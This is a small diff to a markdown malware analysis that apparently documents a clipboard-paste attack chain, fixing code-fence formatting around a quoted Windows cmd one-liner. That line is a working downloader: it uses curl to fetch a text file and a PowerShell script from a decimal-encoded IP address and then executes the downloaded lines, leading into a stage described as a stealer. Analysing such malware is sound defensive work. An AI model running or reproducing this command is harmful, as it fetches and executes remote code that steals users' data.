@@ -36,8 +36,8 @@ Characteristics: Acts strictly as a trigger/loader script to fetch the secondary
 
 When the payload clipboard is executed, it invokes a multi-stage downloader pattern:
 
-(```cmd
-set "__VSCMD_WIN_64BIT=true" && cd %tmp% & curl.exe -sLo %tmp%\trungle.txt 3112851607/438 && curl.exe -sLo %tmp%\Z595.ps1 3112851607/439 && for /f "delims=" %i in (trungle.txt) do %i)
+(```)cmd
+set "__VSCMD_WIN_64BIT=true" && cd %tmp% & curl.exe -sLo %tmp%\trungle.txt 3112851607/438 && curl.exe -sLo %tmp%\Z595.ps1 3112851607/439 && for /f "delims=" %i in (trungle.txt) do %i
 
 
 ## Stage 2: The Stealer (Z595.ps1)
